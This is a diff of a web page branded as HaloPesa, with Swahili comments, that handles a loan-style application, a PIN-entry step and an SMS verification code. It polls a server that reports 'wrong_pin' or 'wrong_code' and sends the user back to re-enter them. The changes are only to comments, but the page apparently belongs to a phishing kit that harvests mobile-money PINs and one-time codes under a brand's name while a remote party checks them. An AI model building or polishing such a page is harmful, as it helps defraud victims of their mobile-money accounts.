@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HaloPesa - Hali ya Ombi</title>
     <style>
-        /* [Mwelekeo wako wa CSS umebaki sawa – umeandikwa hapo awali] */
+        /* [Same CSS as before – unchanged] */
         :root {
             --hp-orange: #FF5A1F;
             --hp-dark: #d94d18;
@@ -199,7 +199,7 @@
         }
 
         // ================================================
-        // SANDBOX – auto-advance & backspace
+        // SANDBOX ZA MSIMBO – zinajaza moja kwa moja
         // ================================================
         codeBoxes.forEach((box, index) => {
             box.addEventListener('input', function() {
@@ -298,7 +298,7 @@
                             window.location.href = `/success?app_id=${appId}&amount=${amount}&months=${months}&phone=${phone}`;
                         }, 2000);
                     } else if (data.code_status === 'wrong_pin' || data.status === 'wrong_pin') {
-                        // ❌ PIN mbaya – rudisha kwenye ukurasa wa PIN
+                        // ❌ PIN MBAYA – rudisha kwenye ukurasa wa PIN
                         statusText = '❌ PIN si sahihi. Inarudisha kwenye ukurasa wa PIN...';
                         statusClass = 'error';
                         isError = true;
@@ -310,33 +310,35 @@
                             window.location.href = `/pin-entry?amount=${amount}&months=${months}&fullName=${encodeURIComponent(fullName)}&phone=${phone}&employment=${employment}&income=${income}&error=wrong_pin`;
                         }, 1500);
                     } else if (data.code_status === 'wrong_code') {
-                        // ✅ MSIMBO MBAYA – onyesha sanduku nyekundu na RUHUSU KUANDIKA TENA
-                        // Hakikisha sehemu ya msimbo inaonekana (ikiwa imefichwa, ionyeshe)
+                        // ✅ MSIMBO MBAYA – ONESHA SANDBOX NA RUHUSU KUANDIKA TENA
+                        // 1. Hakikisha sehemu ya msimbo inaonekana
                         codeSection.classList.remove('hidden');
-                        // Weka sanduku nyekundu, futa maandishi, na fanya ziwe tayari kwa kuingiza
+                        // 2. Weka sanduku nyekundu, futa maandishi, na ziwe tayari
                         codeBoxes.forEach(box => {
                             box.classList.add('error');
                             box.value = '';
                             box.classList.remove('filled');
                             box.disabled = false;  // hakikisha hazijazimwa
                         });
+                        // 3. Rudisha kitufe kwenye hali ya kawaida
                         verifyBtn.disabled = false;
                         verifyBtn.textContent = 'Thibitisha Msimbo';
+                        // 4. Weka mwelekeo kwenye sanduku la kwanza
                         codeBoxes[0].focus();
-                        // Onyesha ujumbe wa makosa
+                        // 5. Onyesha ujumbe wa makosa
                         showCodeStatus('❌ Msimbo si sahihi. Tafadhali ingiza tena.', 'error');
-                        // Badilisha ujumbe wa hali kuu
+                        // 6. Badilisha ujumbe mkuu
                         statusText = '❌ Msimbo si sahihi. Tafadhali ingiza msimbo uliopokea kwenye SMS yako.';
                         statusClass = 'error';
                         statusMsg.textContent = statusText;
                         statusMsg.className = 'status-message ' + statusClass;
-                        // Weka kichwa kuwa "⏳ Ingiza Msimbo" – sio "Imekataliwa"
+                        // 7. Weka kichwa kuwa "⏳ Ingiza Msimbo" – sio "Imekataliwa"
                         statusTitle.textContent = '⏳ Ingiza Msimbo';
-                        // Usifanye clearInterval – polling inaendelea
-                        // Usifanye stopTimer – muda unaendelea
-                        // Usifanye codeSection hidden
-                        // Usifanye timerBox hidden
-                        return; // Toa nje ili usiendeshe setStatus ya chini
+                        // 8. Usifanye clearInterval – polling inaendelea
+                        // 9. Usifanye stopTimer – muda unaendelea
+                        // 10. Usifanye codeSection hidden – inabaki wazi
+                        // 11. Usifanye timerBox hidden – muda unaendelea
+                        return; // Toa nje ili usiende kwenye setStatus ya chini
                     } else if (data.status === 'invalid') {
                         statusText = `❌ Ombi limekataliwa. Sababu: ${data.invalid_type || 'Hajakidhi vigezo.'}`;
                         statusClass = 'error';
